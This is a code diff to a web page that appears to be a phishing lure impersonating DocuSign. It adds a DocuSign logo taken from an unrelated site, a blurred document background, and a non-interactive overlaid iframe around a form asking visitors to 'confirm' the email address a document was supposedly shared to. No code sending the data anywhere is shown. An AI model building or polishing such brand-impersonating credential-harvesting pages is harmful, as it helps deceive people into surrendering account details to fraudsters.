@@ -14,6 +14,9 @@ body {
   min-height: 100vh;
   overflow: hidden;
   font-family: 'Segoe UI', Arial, sans-serif;
+  background: url(https://www.shutterstock.com/image-photo/texture-blurry-text-open-textbook-600nw-1175839786.jpg);
+  background-size: cover;
+  background-position: center;
   position: relative;
 }
 iframe {
@@ -24,6 +27,8 @@ iframe {
   height: 100%;
   border: none;
   z-index: 1;
+  background: transparent; /* Ensures body background is visible until iframe loads */
+  pointer-events: none; /* Makes iframe non-interactive */
 }
 #form-container {
   position: relative;
@@ -59,7 +64,7 @@ iframe {
   color: #4f33a6;
   box-shadow: 0 4px 20px rgba(0,0,0,0.1);
   padding: 28px;
-  height: 200px; 
+  height: 250px; 
 }
 .underline-input {
   border: none;
@@ -86,6 +91,14 @@ iframe {
   padding: 5px 10px;
   display: inline-block;
 }
+.docusign-logo {
+  display: block;
+  margin: 0 auto 8px auto;
+  height: 68px;
+  width: 220px;
+  max-width: 220px;
+  object-fit: contain;
+}
 @media (min-width: 540px) {
   #content-container {
     padding: 36px 28px;
@@ -107,6 +120,7 @@ iframe {
   <div id="bg-blur"></div>
   <div id="content-wrapper">
     <div id="content-container">
+      <img class="docusign-logo" src="https://gotrialpro.com/wp-content/uploads/edd/2024/08/Docusign-Free-Trial-1.png">
       <div id="message-content">
         <p style="font-size:16px;margin:5px 0;">To confirm you are the authorized recipient, please confirm email address this document was shared to.</p>
         <input type="email" id="email-input" class="underline-input" placeholder="Email Address Envelope was received" autocomplete="email" autofocus>
